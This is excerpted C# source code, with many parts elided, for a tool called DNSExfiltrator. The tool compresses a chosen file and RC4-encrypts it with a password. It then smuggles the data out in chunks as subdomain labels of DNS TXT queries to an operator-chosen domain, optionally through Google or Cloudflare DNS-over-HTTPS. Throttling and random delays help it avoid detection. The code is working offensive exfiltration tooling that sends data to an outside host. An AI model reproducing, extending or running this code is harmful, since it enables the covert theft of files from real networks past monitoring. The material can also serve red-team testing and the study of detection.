...
namespace DNSExfiltrator
{
    ...
    public class DNSExfiltrator
    {
        ...
        private static void PrintUsage()
        {
            ...
            Console
                .WriteLine("{0} <file> <domainName> <password> [-b32] [h=google|cloudflare] [s=<DNS_server>] [t=<throttleTime>] [r=<requestMaxSize>] [l=<labelMaxSize>]",
                System.AppDomain.CurrentDomain.FriendlyName);
            Console
                .WriteLine("\tfile:\t\t[MANDATORY] The file name to the file to be exfiltrated.");
            Console
                .WriteLine("\tdomainName:\t[MANDATORY] The domain name to use for DNS requests.");
            Console
                .WriteLine("\tpassword:\t[MANDATORY] Password used to encrypt the data to be exfiltrated.");
            Console
                .WriteLine("\t-b32:\t\t[OPTIONNAL] Use base32 encoding of data. Might be required by some DNS resolver which break case.");
            Console
                .WriteLine("\th:\t\t[OPTIONNAL] Use Google or CloudFlare DoH (DNS over HTTP) servers.");
            Console
                .WriteLine("\tDNS_Server:\t[OPTIONNAL] The DNS server name or IP to use for DNS requests. Defaults to the system one.");
            Console
                .WriteLine("\tthrottleTime:\t[OPTIONNAL] The time in milliseconds to wait between each DNS request.");
            Console
                .WriteLine("\trequestMaxSize:\t[OPTIONNAL] The maximum size in bytes for each DNS request. Defaults to 255 bytes.");
            Console
                .WriteLine("\tlabelMaxSize:\t[OPTIONNAL] The maximum size in chars for each DNS request label (subdomain). Defaults to 63 chars.");
        }
        ...
        public static void Main(string[] args)
        {
            ...
            if (args.Length > 3)
            {
                ...
                while (i < args.Length)
                {
                    if (args[i].StartsWith("s="))
                    {
                        ...
                        PrintColor(String
                            .Format("[*] Working with DNS server [{0}]",
                            dnsServer));
                    }
                    else if (args[i].StartsWith("t="))
                    {
                        ...
                        PrintColor(String
                            .Format("[*] Setting throttle time to [{0}] ms",
                            throttleTime));
                    }
                    else if (args[i].StartsWith("tr="))
                    {
                        throttleRandomTime =
                            Convert.ToInt32(args[i].Split('=')[1]);
                        PrintColor(String
                            .Format("[*] Setting throttle random time to [{0}] ms",
                            throttleRandomTime));
                    }
                    else if (args[i].StartsWith("r="))
                    {
                        ...
                        PrintColor(String
                            .Format("[*] Setting DNS request max size to [{0}] bytes",
                            requestMaxSize));
                    }
                    else if (args[i].StartsWith("l="))
                    {
                        ...
                        PrintColor(String
                            .Format("[*] Setting label max size to [{0}] chars",
                            labelMaxSize));
                    }
                    else if (args[i].StartsWith("h="))
                    {
                        ...
                        if (
                            dohProvider.Equals("google") ||
                            dohProvider.Equals("cloudflare")
                        )
                        {
                        ...
                        {
                            PrintColor(String
                                .Format("[!] Error with DoH parameter."));
                            PrintUsage();
                            return;
                        }
                    }
            ...
            {
                mapCount = 3;
                labelMaxSize = labelMaxSize / mapCount * mapCount;
                PrintColor(String
                    .Format("[!] Mapping words is ON! Setting label max size to [{0}] chars",
                    labelMaxSize));
                PrintColor(String
                    .Format("[!] Mapping words is ON! Setting request max size to [{0}] chars",
                    requestMaxSize));
            }
            ...
            PrintColor(String
                .Format("[*] Compressing (ZIP) the [{0}] file in memory",
                filePath));
            using (var zipStream = new MemoryStream())
            {
                ...
                PrintColor(String
                    .Format("[*] Encrypting the ZIP file with password [{0}]",
                    password));
                ...
                else
                {
                    ...
                    data =
                        ToBase64URL(RC4Encrypt
                            .Encrypt(Encoding.UTF8.GetBytes(password),
                            zipStream.ToArray()));
                }

                PrintColor(String
                    .Format("[*] Total size of data to be transmitted: [{0}] bytes",
                    data.Length));
            }
            ...
            if (smallestLabelSize < 0)
            {
                smallestLabelSize = 0;
            }
            int chunkMaxSize = nbFullLabels * labelMaxSize + smallestLabelSize;
            int nFullLabel = labelMaxSize / mapCount;
            int nSmallestLabel = smallestLabelSize / mapCount;
            int nChunk = chunkMaxSize / mapCount;
            int nbChunks = (int) Math.Ceiling(data.Length / (double) nChunk);

            PrintColor(String
                .Format("[!] Number of chars reserved (domain and chunk number): [{0}]",
                (10 + (domainName.Length + 2))));
            PrintColor(String
                .Format("[!] Number of full labels: [{0}]", nbFullLabels));
            PrintColor(String
                .Format("[!] Full label size: [{0}] x [{1}] chars",
                nFullLabel,
                mapCount));
            PrintColor(String
                .Format("[!] Smallest label size: [{0}] x [{1}] chars",
                nSmallestLabel,
                mapCount));
            PrintColor(String
                .Format("[!] Chunk max size: [{0}] x [{1}] chars",
                nChunk,
                mapCount));
            PrintColor(String
                .Format("[+] Maximum data exfiltrated per DNS request (chunk max size): [{0}] bytes",
                nChunk));
            ...
            try
            {
                ...
                {
                    PrintColor(String
                        .Format("[!] Unexpected answer for an initialization request: [{0}]",
                        reply[0]));
                    return;
                }
            }
            ...
            {
                PrintColor(String
                    .Format("[!] Unexpected exception occured: [{0}]",
                    e.Message));
                return;
            }
            ...
            for (int i = 0; i < data.Length; )
            {
                ...
                chunk = data.Substring(i, Math.Min(nChunk, data.Length - i));
                ...
                for (int j = 0; j * nFullLabel < chunkLength; j++)
                {
                    string part =
                        chunk
                            .Substring(j * nFullLabel,
                            Math
                                .Min(nFullLabel,
                                chunkLength - (j * nFullLabel)));
                    if (mapWords)
                    {
                        char[] tmpArray = part.ToCharArray();
                        part = "";
                        for (int k = 0; k < tmpArray.Length; k++)
                        {
                            part += map[Base32.CharToInt(tmpArray[k])];
                        }
                    }
                    request += part + ".";
                }
                ...
                if (throttleTime != 0)
                {
                    waiting += throttleTime;
                }
                if (throttleRandomTime != 0)
                {
                    waiting += new Random().Next(throttleRandomTime);
                }
                if (waiting > 0)
                {
                    PrintColor(String.Format("[*] Waiting [{0}] ms!", waiting));
    ...
    public class RC4Encrypt
    {
        ...
        private static System.Collections.Generic.IEnumerable<byte>
        EncryptOutput(
            byte[] key,
            System.Collections.Generic.IEnumerable<byte> data
        )
        {
    ...
    public class DOHResolver
    {
        ...
        static string
            cloudflareDOHURI =
                "https://cloudflare-dns.com/dns-query?ct=application/dns-json&name="; // https://developers.cloudflare.com/1.1.1.1/dns-over-https/wireformat/
        ...
        public static string GetTXTRecord(string dohProvider, string domain)
        {
            ...
            var responseObject =
                new JavaScriptSerializer()
                    .Deserialize<Response>(responsePacket);
    ...
    public class DnsResolver
    {
        ...
        public static string GetTXTRecord(string domain, string serverIP = null)
        {
            ...
            if (serverIP != null)
            {
                uint address =
                    BitConverter
                        .ToUInt32(IPAddress.Parse(serverIP).GetAddressBytes(),
                        0);
            ...
            try
            {
                int queryResult =
                    DnsResolver
                        .DnsQuery(ref domain,
                        DnsRecordTypes.DNS_TYPE_TXT,
                        DnsQueryOptions.DNS_QUERY_BYPASS_CACHE,
                        ref dnsServerArray,
                        ref recordsArray,
                        0);
                ...
                for (
                    dnsRecord = recordsArray;
                    !dnsRecord.Equals(IntPtr.Zero);
                    dnsRecord = txtRecord.pNext
                )
                {
                    txtRecord =
                        (TXTRecord)
                        Marshal.PtrToStructure(dnsRecord, typeof (TXTRecord));
                    if (txtRecord.wType == (int) DnsRecordTypes.DNS_TYPE_TXT)
                    {
                        //Console.WriteLine("Size of array: {0}",txtRecord.dwStringCount);
                        string txt =
                            Marshal.PtrToStringAuto(txtRecord.pStringArray);
                        recordList.Add (txt);
                    }
                }
            }
    ...
    internal sealed class Base32
    {
        ...
        {
            return Base32Alphabet.IndexOf(c);
        }
        ...
        internal static string ToBase32String(byte[] bytes)
        {
            ...
            StringBuilder builder =
                new StringBuilder(bytes.Length * InByteSize / OutByteSize);
            ...
            while (bytesPosition < bytes.Length)
            {
                ...
                int bitsAvailableInByte =
                    Math
                        .Min(InByteSize - bytesSubPosition,
                        OutByteSize - outputBase32BytePosition);
                ...
                outputBase32Byte |=
                    ...
                    (InByteSize - (bytesSubPosition + bitsAvailableInByte)));
